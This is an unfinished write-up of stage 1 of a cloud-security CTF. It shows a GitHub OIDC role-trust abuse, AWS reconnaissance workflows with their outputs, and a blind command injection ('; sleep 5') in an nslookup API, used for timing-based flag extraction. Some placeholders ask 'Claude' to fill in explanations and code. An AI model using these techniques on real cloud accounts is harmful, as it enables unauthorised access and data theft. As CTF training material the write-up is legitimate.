
Hello to evereone.

Today i want to tell about my expirience on athe CTF Competiton from MAFAT with name  CLOUD ESCAPE.

Competition have a 3 stages.
1 and 2 for everebody and 3 for a best 20 persons.

I ended a stage 1 and stucked in the end of stage 2 but i think that i fided a solution after endind of the competition.

So here is a Write-Up for the Stage 1 of the this event.

After regestration we get a access for the 1 stage ang get a some short description and get a 2 thinks:
1).git zip file 
2)User code like:000994****\

I downloaded a git folder and opened it with a gitd program for soft usig and checking 

In the the git history we se couple of commits and i finded a couple of the like interesting;
1)this is  a lamda_function.py 
2)policy file of aws.

a code we will use in the future but we start with the policy file.

in the file we see a line:
include a line of corgi
that say to us that we can get comecredential to some aws if we make a request from some repo with the branch with name corgi.

I maded a some test repo on github and maded a first delpoy.yml file to check if this work.
I made a request for AWS Credentials with a user that we geted from the site with role of cicdRole that we finded in the file of .git in hte file xxxxxxx



    name: deploy

    on:
    push:
        branches:
        - corgi

    jobs:
    aws:
        runs-on: ubuntu-latest
        permissions:
        id-token: write

        steps:
        - name: Get AWS credentials
            uses: aws-actions/configure-aws-credentials@v4
            with:
            role-to-assume: arn:aws:iam::009661764077:role/cicdRole
            aws-region: us-east-1


and we get this output:

    Run aws-actions/configure-aws-credentials@v4
    with:
        role-to-assume: arn:aws:iam::009661764077:role/cicdRole
        aws-region: us-east-1
        audience: sts.amazonaws.com
        output-env-credentials: true
    Assuming role with OIDC
    Authenticated as assumedRoleId AROAQEP7C2HWZYKJGPIHM:GitHubActions

Okey, we are in it!

So now we can start a recocnazind of the role and check what we have and what we can to do?

    I start from basic commands:
    aws sts get-caller-identity
    aws s3 ls
    aws lambda list-functions

and this is a deploy file:

    name: deploy

    on:
    push:
        branches:
        - corgi

    jobs:
    aws:
        runs-on: ubuntu-latest
        permissions:
        id-token: write

        steps:
        - name: Get AWS credentials
            uses: aws-actions/configure-aws-credentials@v4
            with:
            role-to-assume: arn:aws:iam::009661764077:role/cicdRole
            aws-region: us-east-1


    - name: Verify AWS identity
            run: aws sts get-caller-identity

        - name: Test AWS permissions
            run: |
            aws s3 ls
            aws lambda list-functions
		  
And we get from here:		  
		  
    Run aws sts get-caller-identity
    aws sts get-caller-identity
    shell: /usr/bin/bash -e {0}
    env:
        AWS_DEFAULT_REGION: us-east-1
        AWS_REGION: us-east-1
        AWS_ACCESS_KEY_ID: ***
        AWS_SECRET_ACCESS_KEY: ***
        AWS_SESSION_TOKEN: ***
    {
        "UserId": "AROAQEP7C2HWZYKJGPIHM:GitHubActions",
        "Account": "009661764077",
        "Arn": "arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions"
    }		  
    aws s3 ls
    aws lambda list-functions
    shell: /usr/bin/bash -e {0}
    env:
        AWS_DEFAULT_REGION: us-east-1
        AWS_REGION: us-east-1
        AWS_ACCESS_KEY_ID: ***
        AWS_SECRET_ACCESS_KEY: ***
        AWS_SESSION_TOKEN: ***
    2026-07-29 16:29:25 codec4f26c862a321ef5
    2026-07-29 16:29:26 platform-bucket-009661764077-us-east-1
    2026-07-29 16:29:25 site781fe43f26b9eba3
    {
        "Functions": [
            {
                "FunctionName": "nslookupv2",
                "FunctionArn": "arn:aws:lambda:us-east-1:009661764077:function:nslookupv2",
                "Runtime": "python3.13",
                "Role": "arn:aws:iam::009661764077:role/lambdaRole",
                "Handler": "lambda_function.lambda_handler",
                "CodeSize": 469,
                "Description": "",
                "Timeout": 15,
                "MemorySize": 512,
                "LastModified": "2026-07-29T16:29:44.127+0000",
                "CodeSha256": "CFvxHj1Tj/ZdUahrJE3buoQSfAn8b2ytHDicjIhAioI=",
                "Version": "$LATEST",
                "VpcConfig": {
                    "SubnetIds": [
                        "subnet-0d86c3129f4405706"
                    ],
                    "SecurityGroupIds": [
                        "sg-0de9d1a2c42a08a3e"
                    ],
                    "VpcId": "vpc-09328d3fa21dce320",
                    "Ipv6AllowedForDualStack": false
                },
                "TracingConfig": {
                    "Mode": "PassThrough"
                },
                "RevisionId": "f62901db-4565-46f5-ad29-480c2d13867c",
                "Layers": [
                    {
                        "Arn": "arn:aws:lambda:us-east-1:009661764077:layer:aws_cli_layer:8",
                        "CodeSize": 27364562
                    },
                    {
                        "Arn": "arn:aws:lambda:us-east-1:009661764077:layer:nslookup_layer:8",
                        "CodeSize": 4313595
                    }
                ],
                "PackageType": "Zip",
                "Architectures": [
                    "x86_64"
                ],
                "EphemeralStorage": {
                    "Size": 512
                },
                "SnapStart": {
                    "ApplyOn": "None",
                    "OptimizationStatus": "Off"
                },
                "LoggingConfig": {
                    "LogFormat": "Text",
                    "LogGroup": "/aws/lambda/nslookupv2"
                }
            }
        ]
    }

So,here we see couple of interesting thinks:
1-we have a 3 buckets

    2026-07-29 16:29:25 codec4f26c862a321ef5
    2026-07-29 16:29:26 platform-bucket-009661764077-us-east-1
    2026-07-29 16:29:25 site781fe43f26b9eba3

2-we  have some function with name

    nslookupv2

    that run from the arn:aws:iam::009661764077:role/lambdaRole Role.
    taht run on some vpc-host:vpc-09328d3fa21dce320

So now we go for the next step:

Check all Roles tha twe have with a:

    aws iam list-attached-role-policies \
                --role-name $ROLE
    aws iam list-role-policies \
                --role-name $ROLE


With this deploy:

    - name: Check IAM permissions
            run: |
            echo "===== ATTACHED ROLE POLICIES ====="

            ROLE=$(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $2}')

            aws iam list-attached-role-policies \
                --role-name $ROLE || true

            echo "===== INLINE POLICIES ====="

            aws iam list-role-policies \
                --role-name $ROLE || true

But this doesnt work and we get a ACCESS DENIED

Okey, now we made a Enumeratingg of the S3 Buckets
With:

        aws s3api get-bucket-location \
              --bucket $bucket 

        aws s3api get-bucket-policy \
          --bucket $bucket 

        aws s3 ls s3://$bucket 

With this deploy:

    - name: Enumerate S3
            run: |
            echo "===== S3 BUCKETS ====="

            aws s3 ls

            echo "===== BUCKET DETAILS ====="

            for bucket in $(aws s3 ls | awk '{print $3}')
            do
                echo "### $bucket"

                aws s3api get-bucket-location \
                --bucket $bucket || true

                aws s3api get-bucket-policy \
                --bucket $bucket || true

                aws s3 ls s3://$bucket || true
            done
And we get:

===== S3 BUCKETS =====
2026-07-29 16:29:25 codec4f26c862a321ef5
2026-07-29 16:29:26 platform-bucket-009661764077-us-east-1
2026-07-29 16:29:25 site781fe43f26b9eba3
===== BUCKET DETAILS =====
### codec4f26c862a321ef5

aws: [ERROR]: An error occurred (AccessDenied) when calling the GetBucketLocation operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions is not authorized to perform: s3:GetBucketLocation on resource: "arn:aws:s3:::codec4f26c862a321ef5" because no identity-based policy allows the s3:GetBucketLocation action
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"LambdaReadAccess\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/lambdaRole\"},\"Action\":[\"s3:GetObject\",\"s3:ListBucket\"],\"Resource\":[\"arn:aws:s3:::codec4f26c862a321ef5/*\",\"arn:aws:s3:::codec4f26c862a321ef5\"],\"Condition\":{\"StringEquals\":{\"aws:SourceVpc\":\"vpc-09328d3fa21dce320\"}}},{\"Sid\":\"ctfPlatformAccess\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/CTFExecutionRole\"},\"Action\":[\"s3:GetObject\",\"s3:ListBucket\",\"s3:PutObject\"],\"Resource\":[\"arn:aws:s3:::codec4f26c862a321ef5/*\",\"arn:aws:s3:::codec4f26c862a321ef5\"]}]}"
}
2026-07-29 16:29:41        469 code.zip
2026-08-02 19:40:26         16 flag.txt
### platform-bucket-009661764077-us-east-1

aws: [ERROR]: An error occurred (AccessDenied) when calling the GetBucketLocation operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions is not authorized to perform: s3:GetBucketLocation on resource: "arn:aws:s3:::platform-bucket-009661764077-us-east-1" because no identity-based policy allows the s3:GetBucketLocation action
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::platform-bucket-009661764077-us-east-1/*\"}]}"
}
2026-08-02 13:23:05      33734 dotgit.zip
### site781fe43f26b9eba3

aws: [ERROR]: An error occurred (AccessDenied) when calling the GetBucketLocation operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions is not authorized to perform: s3:GetBucketLocation on resource: "arn:aws:s3:::site781fe43f26b9eba3" because no identity-based policy allows the s3:GetBucketLocation action
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"PolicyForCloudFrontPrivateContent\",\"Statement\":[{\"Sid\":\"AllowCloudFrontServicePrincipal\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"cloudfront.amazonaws.com\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::site781fe43f26b9eba3/*\",\"Condition\":{\"StringEquals\":{\"AWS:SourceArn\":\"arn:aws:cloudfront::009661764077:distribution/EKD9KH16RB5G3\"}}}]}"
}
                           PRE css/
                           PRE images/
                           PRE js/
2026-07-29 16:33:33        738 index.html

Ouuuuuuu,what we see here:
On codec4f26c862a321ef5 we see a flag.txt is size of 16 byte and some code.zip. and we see that in Policy:
lambdaRole have a GetObject if a request is from the vpc-09328d3fa21dce320.

    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"LambdaReadAccess\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/lambdaRole\"},\"Action\":[\"s3:GetObject\",\"s3:ListBucket\"],\"Resource\":[\"arn:aws:s3:::codec4f26c862a321ef5/*\",\"arn:aws:s3:::codec4f26c862a321ef5\"],\"Condition\":{\"StringEquals\":{\"aws:SourceVpc\":\"vpc-09328d3fa21dce320\"}}.

On platform-bucket-009661764077-us-east-1 we see a file tha twe get from the site fo the copmpetition:

    dotgit.zip

On site781fe43f26b9eba3 we see some file that look like a site with some fronend interface. and in the Policy we see a  {\"Service\":\"cloudfront.amazonaws.com\"} that say that this is some website.

Okey, so now we have a little bit of understatding of what a infrastructure we have here.

3 bucket , one for get a .git , one with a flag that we need and some code on it. and some a website on the cloudfront service.


Now i want to get some more info about vpc enviroment because we know that to get a flag we need to be in vpc.

    - name: Check VPC information
        run: |
          echo "===== VPC ====="

          aws ec2 describe-vpcs

          echo "===== SECURITY GROUPS ====="

          aws ec2 describe-security-groups


And Output is:

    ===== VPC =====
    {
        "Vpcs": [
            {
                "OwnerId": "009661764077",
                "InstanceTenancy": "default",
                "CidrBlockAssociationSet": [
                    {
                        "AssociationId": "vpc-cidr-assoc-0bdded0275d32c953",
                        "CidrBlock": "10.0.0.0/16",
                        "CidrBlockState": {
                            "State": "associated"
                        }
                    }
                ],
                "IsDefault": false,
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "lambda_vpc"
                    }
                ],
                "BlockPublicAccessStates": {
                    "InternetGatewayBlockMode": "off"
                },
                "VpcId": "vpc-09328d3fa21dce320",
                "State": "available",
                "CidrBlock": "10.0.0.0/16",
                "DhcpOptionsId": "dopt-044e3064394b23825"
            },
            {
                "OwnerId": "009661764077",
                "InstanceTenancy": "default",
                "CidrBlockAssociationSet": [
                    {
                        "AssociationId": "vpc-cidr-assoc-0a7661e9cee22c59c",
                        "CidrBlock": "10.0.0.0/16",
                        "CidrBlockState": {
                            "State": "associated"
                        }
                    }
                ],
                "IsDefault": false,
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "codebuild_vpc"
                    }
                ],
                "BlockPublicAccessStates": {
                    "InternetGatewayBlockMode": "off"
                },
                "VpcId": "vpc-09d39837c916df970",
                "State": "available",
                "CidrBlock": "10.0.0.0/16",
                "DhcpOptionsId": "dopt-044e3064394b23825"
            }
        ]
    }
    ===== SECURITY GROUPS =====
    {
        "SecurityGroups": [
            {
                "GroupId": "sg-094f4cd1810de09de",
                "IpPermissionsEgress": [],
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "lambda_vpc-default"
                    }
                ],
                "VpcId": "vpc-09328d3fa21dce320",
                "SecurityGroupArn": "arn:aws:ec2:us-east-1:009661764077:security-group/sg-094f4cd1810de09de",
                "OwnerId": "009661764077",
                "GroupName": "default",
                "Description": "default VPC security group",
                "IpPermissions": []
            },
            {
                "GroupId": "sg-0afb2fb6a12085ce6",
                "IpPermissionsEgress": [],
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "codebuild_vpc-default"
                    }
                ],
                "VpcId": "vpc-09d39837c916df970",
                "SecurityGroupArn": "arn:aws:ec2:us-east-1:009661764077:security-group/sg-0afb2fb6a12085ce6",
                "OwnerId": "009661764077",
                "GroupName": "default",
                "Description": "default VPC security group",
                "IpPermissions": []
            },
            {
                "GroupId": "sg-0de9d1a2c42a08a3e",
                "IpPermissionsEgress": [
                    {
                        "IpProtocol": "tcp",
                        "FromPort": 443,
                        "ToPort": 443,
                        "UserIdGroupPairs": [],
                        "IpRanges": [],
                        "Ipv6Ranges": [],
                        "PrefixListIds": [
                            {
                                "Description": "HTTPS",
                                "PrefixListId": "pl-63a5400a"
                            }
                        ]
                    }
                ],
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "lambda_sg"
                    }
                ],
                "VpcId": "vpc-09328d3fa21dce320",
                "SecurityGroupArn": "arn:aws:ec2:us-east-1:009661764077:security-group/sg-0de9d1a2c42a08a3e",
                "OwnerId": "009661764077",
                "GroupName": "lambda_sg-20260729162940678600000007",
                "Description": "Security Group managed by Terraform",
                "IpPermissions": []
            }
        ]
    }


Claude add here a explanation what we find about a vpc from a output

And now we know that we have somesite that run a CloudFront.





    - name: CloudFront discovery
            run: |
            echo "===== CLOUDFRONT ====="
            aws cloudfront list-distributions || true
            
            
		  
		  
Output:	  
		  
    ===== CLOUDFRONT =====
    {
        "DistributionList": {
            "Items": [
                {
                    "Id": "EKD9KH16RB5G3",
                    "ARN": "arn:aws:cloudfront::009661764077:distribution/EKD9KH16RB5G3",
                    "ETag": "E23ZP02F085DFQ",
                    "Status": "Deployed",
                    "LastModifiedTime": "2026-07-29T16:29:28.290000+00:00",
                    "DomainName": "d67nf28gqfurd.cloudfront.net",
                    "Aliases": {
                        "Quantity": 0
                    },
                    "Origins": {
                        "Quantity": 1,
                        "Items": [
                            {
                                "Id": "s3_oac",
                                "DomainName": "site781fe43f26b9eba3.s3.us-east-1.amazonaws.com",
                                "OriginPath": "",
                                "CustomHeaders": {
                                    "Quantity": 0
                                },
                                "S3OriginConfig": {
                                    "OriginAccessIdentity": "",
                                    "OriginReadTimeout": 30
                                },
                                "ConnectionAttempts": 3,
                                "ConnectionTimeout": 10,
                                "OriginShield": {
                                    "Enabled": false
                                },
                                "OriginAccessControlId": "E1UOO8R317GEA1"
                            }
                        ]
                    },
                    "OriginGroups": {
                        "Quantity": 0
                    },
                    "DefaultCacheBehavior": {
                        "TargetOriginId": "s3_oac",
                        "TrustedSigners": {
                            "Enabled": false,
                            "Quantity": 0
                        },
                        "TrustedKeyGroups": {
                            "Enabled": false,
                            "Quantity": 0
                        },
                        "ViewerProtocolPolicy": "allow-all",
                        "AllowedMethods": {
                            "Quantity": 3,
                            "Items": [
                                "HEAD",
                                "GET",
                                "OPTIONS"
                            ],
                            "CachedMethods": {
                                "Quantity": 2,
                                "Items": [
                                    "HEAD",
                                    "GET"
                                ]
                            }
                        },
                        "SmoothStreaming": false,
                        "Compress": false,
                        "LambdaFunctionAssociations": {
                            "Quantity": 0
                        },
                        "FunctionAssociations": {
                            "Quantity": 0
                        },
                        "FieldLevelEncryptionId": "",
                        "CachePolicyId": "4135ea2d-6df8-44a3-9df3-4b5a84be39ad",
                        "GrpcConfig": {
                            "Enabled": false
                        }
                    },
                    "CacheBehaviors": {
                        "Quantity": 0
                    },
                    "CustomErrorResponses": {
                        "Quantity": 0
                    },
                    "Comment": "CloudFront distribution for S3 bucket.",
                    "PriceClass": "PriceClass_100",
                    "Enabled": true,
                    "ViewerCertificate": {
                        "CloudFrontDefaultCertificate": true,
                        "SSLSupportMethod": "vip",
                        "MinimumProtocolVersion": "TLSv1",
                        "CertificateSource": "cloudfront"
                    },
                    "Restrictions": {
                        "GeoRestriction": {
                            "RestrictionType": "whitelist",
                            "Quantity": 1,
                            "Items": [
                                "IL"
                            ]
                        }
                    },
                    "WebACLId": "arn:aws:wafv2:us-east-1:009661764077:global/webacl/cloudfront-waf/9e7d5a49-e381-4d96-883b-a01ea6d5d18e",
                    "HttpVersion": "HTTP2",
                    "IsIPV6Enabled": false,
                    "Staging": false,
                    "ConnectionMode": "direct"
                }
            ]
        }
    }

Okey we find some domain:
"DomainName": "d67nf28gqfurd.cloudfront.net"
Now we will made a check what is this domain.
We PUT it to the browser:

    https://d67nf28gqfurd.cloudfront.net

and get some FrontEnd page with Header of NSLOOKUP.
That get some reqesut in the line and made something.
We try to write something and we get a Ouptut of:

    ip_address": "wip",
    "domain": "wip"
Wieard, in the code we of lamda we saw that he need to made a nslookup command with a variable that ge get from the function and he return a output.

Lest explore more.

 We go to the Source code of the page and we some JAVA.SCRIPT code.
Open it and see that he made a request for the api hand of:

    https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup

Okey , we can now to made a direct request for a API hand and get a direct Output.

Lets try with some curl command:

Clause put to here some cult code that send a data for theapi

And this is a Output that we get:

    {
    "body" : {
        "ip_address": "wip",
        "domain": "wip",
        "timestamp": "02/Aug/2026:20:59:01 +0000"
    }
    }

I try a couple of times different input. But all each time get a same Output.
I try to made some executable commands with && or ; to try a get more info bu get the same WIP output.


So i think about a another way to get a akknowladge that a Commands trhat i send a really working/

So basic check is send a ; sleep 5 and check a time of responce and check with ;sleep 10.

claude wade a comand that check time of the return of the output from the curl to api with the sleep 5 and slepp 10/


Yes!We see that sleep is working.

So we for now e understand that we have a output only with the time of responce.

Soooooo.What we can to do?

How time of the responce can transmit data? He can.

This can be a tool of bolian like:

    If somethink==somethink:
        sleep 5
    else:
        sleep 10

or more if-elseif.

So i started to check if i can to read a flag.txt and if yes i get a sleep of 5 second andd if not sleep 10.

nad i get a responce in th e5.5 seconds. that mean that we can to read a flag.

but how we transport a output of the cat flag.txt to me?

Check if each characters form the 16 byte = to some characters and if yes t made a short sleep?

This is a 127 options of ASCII * 16 = 2032 checking of the flag data in maximum and if each one islike a 10 secnds this is a:338 minutes or 5:30+- hours.
Bad....

Or we can made somethink more interesting. Binarry Search.To check if Character if bigger from cencter of maximum value(127) we take a 65 ad if not we start to check if it biger from the center from the opsite side of the chekcing(if we checked that if bigger fro 65 and he i not we go to the sime of small and check if now in tbigger that 32 and if not bigger from the 16 and ...)
so after that we have only 7 checking steps for each byte. that mean that maximum time it now 18.6 minutes in maximum.

Okey, we start to checking with this code that we run on local pc that made a auto api request and binnary check with the sleep time difference.







and after 15 minutes i get a FLLLLLLAGGGG!
I put it to the site and go to the second stage of competition.

See a Write-Up of the Competition Here:xxxxxxxx
